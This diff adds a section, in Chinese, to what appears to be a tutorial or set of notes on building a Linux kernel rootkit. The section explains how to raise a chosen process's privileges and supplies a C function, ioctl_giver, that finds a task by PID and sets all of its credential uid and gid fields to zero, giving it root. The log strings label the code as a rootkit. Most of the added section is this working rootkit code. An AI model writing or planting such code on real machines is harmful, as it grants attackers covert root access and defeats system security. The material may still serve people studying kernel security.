@@ -75,7 +75,31 @@ struct cred init_cred = {
         commit_creds((struct cred *)tsk->cred);
 ```
 
+### 1.3. 提升指定进程权限
 
+这里不难理解，只需要使用内核提供的函数`get_pid_task`就可以获取对应pid的task结构体，然后修改其中cred内容即可
+
+```c
+static int ioctl_giver(pid_t pid){
+    struct pid *user_pid;
+    struct task_struct *finded_task;
+    struct cred * cur_cred;
+        user_pid = find_get_pid(pid);
+        if(IS_ERR(user_pid)){
+            printk(KERN_INFO "[peiwithhao rootkit] Failed to find the pid...");
+            return PTR_ERR(user_pid);
+        }
+    finded_task = get_pid_task(user_pid, PIDTYPE_PID);
+        if(IS_ERR(finded_task)){
+            printk(KERN_INFO "[peiwithhao rootkit] Failed to find the task_struct...");
+            return PTR_ERR(finded_task);
+        }
+        cur_cred = (struct cred *)finded_task->cred;
+        cur_cred->uid = cur_cred->euid = cur_cred->suid = cur_cred->fsuid = KUIDT_INIT(0);
+        cur_cred->gid = cur_cred->egid = cur_cred->sgid = cur_cred->fsgid = KGIDT_INIT(0);
+    return 0;
+}
+```
 
 
 
